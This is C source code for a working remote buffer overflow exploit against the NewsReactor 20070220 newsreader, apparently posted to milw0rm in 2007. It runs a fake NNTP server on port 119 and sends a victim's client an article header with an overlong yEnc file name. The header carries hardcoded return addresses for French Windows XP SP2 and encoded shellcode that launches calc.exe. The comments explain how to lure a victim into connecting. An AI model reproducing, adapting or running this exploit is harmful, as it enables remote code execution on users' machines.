/********************************************************************************
*         NewsReactor 20070220 Article Grabbing Remote Buffer Overflow          *
*                                Exploit 1                                      *
*                                                                               *
*                                                                               *
* There is remote buffer overflow in NewsReactor 20070220 that can be triggered *
* by grabbing articles that contain an overly long file name.                   *
*                                                                               *
* To exploit, convince someone to set his newsgroup server to your ip:119 and   *
* ask him to grab an article (say with a .NZB file).                            *
*                                                                               *
* This exploit waits for incoming connection and then runs calc.exe.            *
*                                                                               *
* Return address should work on XP SP2 FR.                                      *
* Should fail on english systems cause I took the first return address I got =D.*
* Have Fun!                                                                     *
*                                                                               *
* Tested against WIN XP SP2 FR                                                  *
* Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>                    *
********************************************************************************/



#include "winsock2.h"
#include "stdio.h"
#include "time.h"
#include "stdlib.h"
#pragma comment(lib, "ws2_32.lib")

/* win32_exec -  EXITFUNC=process CMD=calc.exe Size=351 Encoder=PexAlphaNum http://metasploit.com */
/* 0x00 0x0b 0x0c 0x0a 0x0d 0x0e 0x0f 0x09 0x20 0x22 0x7C */
char calcshellcode[] =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37"
"\x45\x50\x4a\x57\x41\x50\x4f\x4e\x4b\x48\x4f\x34\x4a\x51\x4b\x48"
"\x4f\x55\x42\x52\x41\x50\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x58"
"\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
"\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x50\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x53\x46\x35\x46\x42\x46\x30\x45\x57\x45\x4e\x4b\x58"
"\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x36\x4b\x58\x4e\x50\x4b\x44"
"\x4b\x48\x4f\x55\x4e\x51\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x48"
"\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x52\x46\x50\x43\x4c\x41\x43"
"\x42\x4c\x46\x56\x4b\x48\x42\x34\x42\x53\x45\x48\x42\x4c\x4a\x47"
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x37\x4e\x51\x4d\x4a"
"\x4b\x38\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"
"\x42\x30\x42\x50\x42\x30\x4b\x48\x4a\x56\x4e\x53\x4f\x35\x41\x53"
"\x48\x4f\x42\x46\x48\x35\x49\x58\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x56\x50\x47\x4a\x4d\x44\x4e\x43\x57\x4a\x56\x4a\x59"
"\x50\x4f\x4c\x58\x50\x50\x47\x45\x4f\x4f\x47\x4e\x43\x56\x41\x56"
"\x4e\x56\x43\x36\x50\x42\x45\x56\x4a\x47\x45\x36\x42\x30\x5a";



int main(int argc, char* argv[])
{
	char recvbuff[1024];
	char evilbuff[10000];
	sockaddr_in sin;
	int server,client;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(1,1), &wsaData);

	server = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_port = htons( 119 );
	bind(server,(SOCKADDR*)&sin,sizeof(sin));
	printf("[+] NewsReactor Article Grabbing Remote Buffer Overflow\n");
	printf("[+] Coded and Discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
	printf("[*] Listening on port 119...\n");
	listen(server,5);
	printf("[*] Waiting for client ...\n");
	client=accept(server,NULL,NULL);
	printf("[+] Client connected\n");
	
	if (send(client,"200 Hello there\r\n",17,0)==-1)
	{
		printf("[-] Error in send!\n");
		exit(-1);
	}

	//BODY article or AUTHINFO user
	memset(recvbuff,0,1024);
	recv(client,recvbuff,1024,0);
	printf("-> %s\n",recvbuff);
	if (strstr(recvbuff,"AUTHINFO")) {
		send(client,"381 Pass please?\r\n",18,0);

		//authinfo pass
		memset(recvbuff,0,1024);
		recv(client,recvbuff,1024,0);
		printf("-> %s\n",recvbuff);
		send(client,"281 Pleased to meet you\r\n",25,0);
	
		//BODY article
		memset(recvbuff,0,1024);
		recv(client,recvbuff,1024,0);
		printf("-> %s\n",recvbuff);	
	}

	char* postname=(char *) malloc(strlen(recvbuff)*sizeof(char));
	memset(postname,0,100);
	if (!strstr(recvbuff,"BODY")) {
		printf("[-] BODY were expected. Exploit will fail.\n");
	}
	else {
		memcpy(postname,recvbuff+5,strlen(recvbuff)-5);
		printf("[+] Using %s to exploit.\n",postname);
	}
	
char header[]="220 0 ";
char header2[]=
" article\r\n"
"=ybegin part=1 line=128 size=127 name="
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAA"
"\xD6\xE6\xE3\x77" //jmp EDI in advapi32.dll XP SP2 FR.
"\xD6\xE6\xE3\x77" //ugly but we don't know where we land...
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77" 
"\xD6\xE6\xE3\x77"
"AAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAA";

char end[]=
"\r\n"
"=ypart begin=1 end=127\r\n"
"BLABLABLA\r\n"
"=yend size=127 part=1 pcrc32=d4f19f0f\r\n"
".\r\n\0";

	memset(evilbuff,'A',10000);
	memcpy(evilbuff,header,strlen(header));
	memcpy(evilbuff+strlen(header),postname,strlen(postname));
	memcpy(evilbuff+strlen(header)+strlen(postname),header2,strlen(header2));
	memcpy(evilbuff+strlen(header)+strlen(postname)+strlen(header2),calcshellcode,strlen(calcshellcode));
	memcpy(evilbuff+strlen(header)+strlen(postname)+strlen(header2)+strlen(calcshellcode)+70,end,strlen(end));
	send(client,evilbuff,strlen(evilbuff),0);
	
	printf("[+] Evil data sent. Have fun!\n");
	Sleep(500);
	return 0;
	
}

// milw0rm.com [2007-03-12]
